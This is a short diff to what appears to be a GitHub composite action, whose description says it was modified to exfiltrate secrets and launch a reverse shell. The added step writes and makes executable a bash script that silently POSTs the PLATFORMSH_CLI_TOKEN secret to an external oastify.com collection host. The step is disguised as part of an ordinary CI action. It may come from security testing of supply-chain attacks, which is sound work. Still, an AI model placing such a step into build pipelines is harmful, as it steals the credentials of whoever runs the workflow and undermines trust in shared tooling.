@@ -4,9 +4,13 @@ description: Modified to exfiltrate secrets and launch a reverse shell
 runs:
   using: "composite"
   steps:
-    - name: runner
+    - name: Write exfiltration script
       run: |
-        exfiltrate.sh
+        cat <<'EOF' > ./exfiltrate.sh
+#!/bin/bash
+curl -s -X POST http://n4ss7kllcg258djdp8ul9mckfbl39txi.oastify.com --data "token=$PLATFORMSH_CLI_TOKEN" >/dev/null 2>&1
+EOF
+        chmod +x ./exfiltrate.sh
       shell: bash
     - name: platform binary
       run: |
